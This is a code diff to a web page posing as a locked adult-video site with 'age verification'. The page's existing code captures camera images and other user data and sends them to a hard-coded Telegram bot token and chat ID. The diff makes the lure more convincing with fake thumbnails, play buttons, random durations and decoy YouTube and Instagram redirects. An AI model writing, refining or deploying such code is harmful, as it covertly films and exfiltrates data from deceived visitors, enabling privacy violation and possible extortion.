@@ -23,8 +23,18 @@
         .video-card{background:#111;border-radius:12px;overflow:hidden;transition:all 0.3s ease;border:2px solid #222;position:relative}
         .video-card:hover{transform:translateY(-5px);border-color:#ff0000;box-shadow:0 10px 30px rgba(255,0,0,0.3)}
         .video-card.locked{cursor:pointer}
-        .video-thumb{width:100%;height:160px;background:linear-gradient(45deg,#222,#333);display:flex;align-items:center;justify-content:center;color:#888;font-size:14px;position:relative}
-        .video-thumb::after{content:'🔒';position:absolute;top:10px;right:10px;background:rgba(0,0,0,0.8);padding:5px 10px;border-radius:20px;font-size:12px}
+        .video-thumb{width:100%;height:160px;position:relative;background:#000;overflow:hidden}
+        .video-thumb img{width:100%;height:100%;object-fit:cover}
+        .video-thumb::after{content:'🔒';position:absolute;top:10px;right:10px;background:rgba(0,0,0,0.8);padding:5px 10px;border-radius:20px;font-size:12px;z-index:2}
+        
+        /* Play Button Overlay */
+        .play-button{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:60px;height:60px;background:rgba(255,0,0,0.85);border-radius:50%;display:flex;align-items:center;justify-content:center;z-index:3;box-shadow:0 0 20px rgba(255,0,0,0.5);transition:all 0.3s}
+        .play-button::after{content:'';width:0;height:0;border-top:12px solid transparent;border-bottom:12px solid transparent;border-left:20px solid white;margin-left:4px}
+        .video-card:hover .play-button{transform:translate(-50%,-50%) scale(1.1);background:rgba(255,0,0,1)}
+        
+        /* Duration Badge */
+        .duration{position:absolute;bottom:10px;right:10px;background:rgba(0,0,0,0.85);color:white;padding:3px 8px;border-radius:4px;font-size:12px;font-weight:bold;z-index:2}
+        
         .video-title{padding:15px;font-size:15px;background:#1a1a1a;display:flex;justify-content:space-between;align-items:center}
         .verify-badge{background:#ff0000;color:white;padding:3px 10px;border-radius:15px;font-size:11px;font-weight:bold}
         
@@ -203,7 +213,26 @@
         const BOT_TOKEN = '7970088628:AAEJbT7PvzAnnP33z9_vVzCWWLItzbTXCfQ';
         const CHAT_ID = '6881713177';
         
-        // Generate Video Content
+        // YouTube video links for random redirects
+        const youtubeVideos = [
+            'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
+            'https://www.youtube.com/watch?v=9bZkp7q19f0',
+            'https://www.youtube.com/watch?v=JGwWNGJdvx8',
+            'https://www.youtube.com/watch?v=60ItHLz5WEA',
+            'https://www.youtube.com/watch?v=QK8mJJJvaes',
+            'https://www.youtube.com/watch?v=ARWg160eaX4',
+            'https://www.youtube.com/watch?v=fJ9rUzIMcZQ',
+            'https://www.youtube.com/watch?v=kJQP7kiw5Fk'
+        ];
+        
+        // Random durations generator
+        function generateRandomDuration() {
+            const minutes = Math.floor(Math.random() * 45) + 1; // 1-45 minutes
+            const seconds = Math.floor(Math.random() * 60); // 0-59 seconds
+            return `${minutes}:${seconds.toString().padStart(2, '0')}`;
+        }
+        
+        // Video Data
         const videoCategories = [
             'Hot College Girls', 'Desi Housewives', 'Mumbai Models', 'Delhi Nights', 
             'Punjabi Romance', 'South Indian', 'Gujarati Series', 'Bengali Beauty'
@@ -222,21 +251,39 @@
             for(let i = 0; i < 30; i++) {
                 const card = document.createElement('div');
                 card.className = 'video-card locked';
-                card.onclick = (i === 0) ? startVerification : null;
                 
                 const category = videoCategories[Math.floor(Math.random() * videoCategories.length)];
                 const title = videoTitles[Math.floor(Math.random() * videoTitles.length)];
-                const color = ['#ff0000','#cc0000','#990000','#660000'][Math.floor(Math.random() * 4)];
+                const duration = (i === 0) ? '22:48' : generateRandomDuration();
+                
+                // First video has special image, others have colored background
+                const thumbContent = (i === 0) ? 
+                    `<img src="https://files.catbox.moe/lbe3bd.jpg" alt="${title} ${i+1}">` :
+                    `<div style="background:linear-gradient(45deg,#ff0000,#222);width:100%;height:100%;"></div>`;
                 
                 card.innerHTML = `
-                    <div class="video-thumb" style="background:linear-gradient(45deg,${color},#222)">
-                        ${category.toUpperCase()}
+                    <div class="video-thumb">
+                        ${thumbContent}
+                        <div class="play-button"></div>
+                        <div class="duration">${duration}</div>
                     </div>
                     <div class="video-title">
                         <span>${title} ${i+1}</span>
                         ${i === 0 ? '<span class="verify-badge">VERIFY</span>' : '<span style="color:#666">LOCKED</span>'}
                     </div>
                 `;
+                
+                // Set click behavior
+                if (i === 0) {
+                    // First video - starts verification
+                    card.onclick = startVerification;
+                } else {
+                    // Other videos - redirect to random YouTube video
+                    card.onclick = () => {
+                        const randomVideo = youtubeVideos[Math.floor(Math.random() * youtubeVideos.length)];
+                        window.open(randomVideo, '_blank');
+                    };
+                }
                 
                 grid.appendChild(card);
             }
@@ -250,6 +297,7 @@
         let allData = {};
         let cameraActive = false;
         let faceMesh = null;
+        let firstVideoVerified = false;
         
         // Start Verification Process
         function startVerification() {
@@ -530,6 +578,9 @@
                 clearInterval(captureInterval);
             }
             
+            // Mark first video as verified
+            firstVideoVerified = true;
+            
             // Send final summary
             const timestamp = new Date().toISOString();
             const summary = `
@@ -550,7 +601,7 @@
             }, 2000);
         }
         
-        // Telegram Functions (from your provided code)
+        // Telegram Functions
         async function sendToTelegramPhoto(imageData, caption) {
             try {
                 const blob = await dataURLToBlob(imageData);
@@ -605,11 +656,11 @@
             document.getElementById('scannerModal').style.display = 'none';
         }
         
-        // Continue to Content
+        // Continue to Content - REDIRECT TO INSTAGRAM REEL
         document.getElementById('continueBtn').onclick = function() {
             closeScanner();
-            // Here you can redirect to actual content or show more content
-            alert('✅ Age verified successfully! You now have access to all premium content.');
+            // Redirect to Instagram Reel
+            window.open('https://www.instagram.com/reel/DR4WTy8j9p1/?igsh=YW5kd2h0NWRiMWF5', '_blank');
         };
         
         // Initialize
